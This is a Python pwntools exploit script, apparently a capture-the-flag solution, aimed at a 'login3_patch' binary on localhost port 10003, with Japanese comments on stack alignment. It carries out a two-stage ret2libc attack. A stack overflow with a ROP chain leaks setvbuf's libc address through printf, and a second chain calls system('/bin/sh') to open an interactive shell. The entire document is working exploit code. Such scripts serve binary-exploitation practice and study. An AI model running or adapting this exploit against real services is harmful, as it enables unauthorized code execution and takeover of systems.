#!/usr/bin/env python3
from pwn import *

bin_file = './login3_patch'
context(os = 'linux', arch = 'amd64')
context(terminal = ['tmux', 'splitw', '-h'])
context.log_level = 'debug'

binf = ELF( bin_file )

libc = binf.libc
offset_libc_setvbuf = libc.functions['setvbuf'].address
addr_got_setvbuf = binf.got['setvbuf']

def attack( proc, **kwargs ):
    
    rop = ROP( binf )
    rop.raw( rop.ret ) # 16byteアライメントのため
    rop.printf( addr_got_setvbuf )
    rop.raw( rop.ret ) # 16byteアライメントのため
    rop.main()
    
    proc.sendlineafter( 'ID: ', b'a' * 32 + p64(0xdeadbeaf) + bytes(rop) )
    proc.recvuntil( "Invalid ID" )
    proc.recv(1)
    addr_libc_setvbuf = unpack( proc.recv(6), 'all' )
    libc.address = addr_libc_setvbuf - offset_libc_setvbuf
    info( f"addr_libc_base = {libc.address:#x}, addr_libc_setvbuf={addr_libc_setvbuf:#x}" )
    addr_libc_str_sh = next( libc.search(b'/bin/sh') )
    
    rop = ROP( libc )
    rop.raw( rop.ret )
    rop.system( addr_libc_str_sh )
    
    proc.sendlineafter('ID: ', b'a' * 32 + p64(0xdeadbeaf) + bytes(rop) )
    
    #info( proc.recvall() )

def main():
    
    adrs = "localhost"
    port = 10003
    
    #proc = gdb.debug( bin_file )
    #proc = process( bin_file )
    proc = remote( adrs, port )
    
    attack( proc )
    proc.interactive()

if __name__ == '__main__':
    main()
